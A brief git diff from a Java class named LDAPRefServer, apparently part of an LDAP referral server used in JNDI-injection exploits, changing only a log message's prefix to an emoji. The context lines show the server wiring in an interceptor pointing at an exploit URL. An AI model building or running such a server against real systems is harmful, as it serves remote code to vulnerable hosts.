@@ -65,7 +65,7 @@ public class LDAPRefServer extends Thread {
 
 			config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(LDAP_PATH_TO_EXPLOIT)));
 			InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
-			System.err.println("!! LDAP listening on :" + PORT);
+			System.err.println("🔌 LDAP listening on :" + PORT);
 			ds.startListening();
 
 		} catch (Exception e) {
